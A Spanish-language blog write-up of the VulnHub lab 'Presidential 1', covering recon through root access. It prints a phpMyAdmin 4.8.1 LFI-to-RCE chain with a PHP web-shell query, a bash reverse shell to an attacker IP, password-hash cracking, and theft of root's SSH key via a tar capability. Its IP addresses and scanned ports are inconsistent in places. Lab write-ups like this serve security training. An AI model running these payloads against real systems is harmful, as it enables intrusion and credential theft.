---
layout: single
title: Presidential 1 - VulnHub
excerpt: " The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched. "
date: 2023-02-27
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-presidential1/presidential.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - phpMyAdmin
  - LFI
  - RCE
  - MySQL
  - John
  - Capabilities
---

The Presidential Elections within the USA are just around the corner (November 2020). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, and falsifying the votes.


The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see if you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website and registration system are launched.

# Summary
- IP: 192.168.1.42
- Ports: 80,2082
- OS: Linux (CentOS)
- Services & Applications:
	-  80 -> Apache httpd 2.4.6 ((CentOS)
	-  2082 -> OpenSSH 7.4 (protocol 2.0)

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.41 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p21,22,80 -sCV 192.168.1.41 -oN targeted
```




# Análisis de página web:


- Al analizar la página principal, vemos en el pie de página un dominio `"votenow.local"`, lo agregamos al "/etc/hosts" y accedemos.

- Al abrir este dominio vemos la misma página inicial, hacemos una búsqueda de directorios y archivos interesantes con gobuster:

```bash
$gobuster dir -u http://votenow.local/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x zip,backup,bak,php.backup,php.bak,backup.php
```

- Encontramos un archivo `"config.php.bak"`, lo abrimos y en el código fuente encontramos unas credenciales para la base de datos, las guardamos en un archivo "credentials.txt".

- Hacemos búsqueda profunda de subdominios:

```bash
$gobuster vhost -u http://votenow.local -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | grep -v "400"
```

- Encontramos el subdominio `"datasafe.votenow.local"`, lo agregamos al "/etc/hosts" y accedemos.



# phpMyAdmin 4.8.1 LFI to RCE:

- Nos encontramos con una página de `phpMyAdmin`, usamos aquí las credenciales anteriormente encontradas y accedemos.

- Primero ojeamos la base de datos, encontramos una base de datos llamada "votebox" con la tabla "users" en donde podemos ver el hash para el usuario "admin", guardamos este hash en un archivo "hash.txt"

- Buscamos vulnerabilidades para `phpMyAdmin` y encontramos un Local File Inclusion que podemos derivar a un `RCE`:

```bash
$searchsploit phpmyadmin
```

```bash
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)
```

```bash
searchsploit -x php/webapps/44928.txt
```

```
1. Run SQL Query : select '<?php phpinfo();exit;?>'
2. Include the session file :
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k
```


- Entonces, ejecutamos una `Query`, en este caso, para ejecutar un comando que nos otorgue un parámetro "cmd" el cual lo usaremos para entablar una reverse shell desde el enlace:

```js
select "<?php echo passthru($_GET['cmd']); ?>"
```

- Ahora, accedemos mediante el `LFI` a la ruta que nos indica el exploit, corrigiendo en la parte de "sessions" a "session" y cambiando el valor de la cookie "11njnj4253qq93vjm9q93nvc7p2lq82k" por la nuestra:

```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_g3vpoi1ngebmq9a5ividh5g3ee10vmgg
```

- Comprobamos que haya ejecutado el comando que le dijimos ejecutando algo mediante el parámetro "cmd":

```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_g3vpoi1ngebmq9a5ividh5g3ee10vmgg&cmd=ls -l /
```

- Y ahora entablamos una reverse shell:

```
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_g3vpoi1ngebmq9a5ividh5g3ee10vmgg&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.35/443 0>%261"
```

- Ganamos acceso al sistema como el usuario `"apache"`



# ESCALANDO PRIVILEGIOS:

- Vemos que existe un usuario `"admin"` en el sistema.

- Usamos el hash que habíamos encontrado para intentar pivotar a este usuario (Tomará unos minutos el cracking de este hash, se recomienda usar hashcat):

```bash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```

- Encontramos la contraseña para el usuario "admin", pivotamos a este:

```bash
$su admin
```

- Buscamos `capabilities`, y encontramos lo siguiente:

```bash
$getcap -r / 2>/dev/null

/usr/bin/tarS = cap_dac_read_search+ep
```


- Es decir, tenemos la capacidad de `lectura` de archivos usando el binario "tarS" el cual es equivalente al binario "tar".

- Usamos esta capacidad para `comprimir` un directorio al cual normalmente no tendríamos acceso, como lo es el directorio "/root/.ssh" en busca de credenciales de SSH:

```bash
$cd /tmp
$tarS -cvf root.tar /root/.ssh
```

- Ahora, descomprimimos este archivo ".tar" que hemos creado:

```bash
tarS -xf root.tar
```

- Abrimos el directorio `"/root/.ssh"` y copiamos el archivo `"id_rsa"` en nuestra máquina atacante:

- Ahora, le damos permisos al archivo y accedemos como root via SSH:

```bash
$ssh -i id_rsa root@192.168.1.43 -p 2082
```

- Y seremos `root`.


